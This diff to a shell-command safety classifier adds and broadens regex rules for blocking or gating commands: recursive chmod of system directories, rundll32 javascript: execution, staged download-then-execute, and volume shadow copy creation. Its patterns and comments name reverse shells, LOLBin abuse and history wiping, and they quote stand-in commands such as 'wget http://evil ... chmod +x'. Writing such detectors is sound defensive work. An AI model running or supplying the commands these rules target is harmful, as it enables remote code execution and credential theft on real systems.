@@ -41,7 +41,11 @@ export const BLACK_SHELL = [
   // tac/rev) into an interpreter — `curl evil | tee x | bash` — is still caught,
   // staying within one pipeline (no ; to a separate command).
   { re: PIPE_INTERP, why: 'pipe remote download to an interpreter (RCE)', gate: pipeDownloadIsExternal },
-  { re: /\bchmod\s+-R\s+0?777\s+\//i, why: 'world-writable root' },
+  // recursive chmod of the root/system tree — any mode is destructive there:
+  // 777 opens it world-writable, 000 locks even root out. Reuses the rm rule's
+  // target clause so a benign deploy `chmod -R 755 /home/app/dist` (deep path)
+  // and `chmod +x script.sh` (no -R / no root target) stay clean.
+  { re: /\bchmod\s+(?:--recursive|-[a-z]{0,3}R[a-z]{0,3})\s+(?:[0-7]{3,4}|[ugoa=+-]{1,4}[rwxst]{1,6})[^|]{0,10}?(?:\s\/\s*$|\s\/(?:etc|usr|var|bin|lib|boot|sys|root|home|opt)(?:\/?\s|\/?$)|\s\/\*)/i, why: 'recursive chmod of the root/system tree' },
   { re: /\bhistory\s+-c\b|\bunset\s+HISTFILE\b|rm\s+[^|]*\.bash_history/i, why: 'covering tracks (history wipe)' },
   { re: /\/dev\/tcp\//i, why: 'reverse shell (/dev/tcp)' },
   { re: /\bn(?:c|cat)\b[^|]*\s-[a-z]*e\b/i, why: 'netcat exec (reverse shell)' },
@@ -96,6 +100,7 @@ export const BLACK_SHELL = [
   { re: /\bmshta(?:\.exe)?\b[^|]*(?:https?:|javascript:|vbscript:)/i, why: 'mshta remote/script exec (LOLBin)' },
   { re: /\bregsvr32(?:\.exe)?\b[^|]*(?:\/i:\s*https?:|scrobj\.dll)/i, why: 'regsvr32 scriptlet exec (LOLBin)' },
   { re: /\bmsiexec(?:\.exe)?\b[^|]*\/i\b[^|]*https?:/i, why: 'msiexec remote package (LOLBin)' },
+  { re: /\brundll32(?:\.exe)?\b[^|]*javascript:/i, why: 'rundll32 javascript: protocol exec (LOLBin)' },
   { re: /\bwmic\b[^|]*\bprocess\b[^|]*\bcall\s+create\b/i, why: 'WMI process creation (exec)' },
   // --- download-and-execute (Unix). Process substitution / sh -c that a shell
   //     actually executes; `diff <(curl a) <(curl b)` (no sh/source) won't match. ---
@@ -104,7 +109,9 @@ export const BLACK_SHELL = [
   { re: /\bpython[0-9.]*\b\s+-c\b(?=[^|]*\b(?:urlopen|urlretrieve|requests\.get)\b)(?=[^|]*\b(?:exec|eval|os\.system|subprocess|popen)\b)/i, why: 'python download-and-exec (RCE)' },
   // staged download-then-execute (two-step, not a single pipe)
   { re: /\b(?:curl|wget)\b[^|]*?\s-o\b[^|]*?[;&][^|]*?\b(?:bash|sh|zsh|source)\b/i, why: 'staged download-then-execute (RCE)' },
-  { re: /\b(?:curl|wget)\b[^|]*?&&[^|]*?\bchmod\s+\+x\b/i, why: 'download + make-executable (staged RCE)' },
+  // download then make-executable — the same staged RCE whether chained with
+  // && or ; (`wget http://evil -O /tmp/x; chmod +x /tmp/x; /tmp/x`).
+  { re: /\b(?:curl|wget)\b[^|]*?(?:&&|;)[^|]*?\bchmod\s+\+x\b/i, why: 'download + make-executable (staged RCE)' },
   // git config-override / transport RCE (sshCommand, fsmonitor, pager, ext::)
   { re: /\bgit\b[^|]*\s-c\s+(?:core\.(?:sshCommand|pager|fsmonitor|hooksPath)|gpg\.program)\s*=/i, why: 'git -c config-override RCE' },
   { re: /\bgit\s+config\b[^|]*\bcore\.(?:sshCommand|fsmonitor|pager|hooksPath)\b/i, why: 'git config core.* RCE override' },
@@ -178,6 +185,10 @@ export const RED_SHELL = [
   { re: /\bmount\b\s+\/dev\//i, why: 'mounts a block device' },
   { re: /\bnet\s+user\b[^|]*\/add/i, why: 'creates a user account' },
   { re: /\bInvoke-WmiMethod\b/i, why: 'WMI method invocation' },
+  // vssadmin CREATE shadow is dual-use (legit backups; also the standard prep to
+  // read a locked SAM/NTDS.dit from the copy) → gate, not block. The ransomware
+  // DELETE-shadows variant stays black in BLACK_SHELL.
+  { re: /\bvssadmin\b[^|]*\bcreate\b[^|]*shadow/i, why: 'creates a volume shadow copy (possible credential-theft prep)' },
 ];
 export const YELLOW_SHELL = [
   { re: /\b(mkdir|touch|mv|cp)\b/i, why: 'reversible filesystem change' },
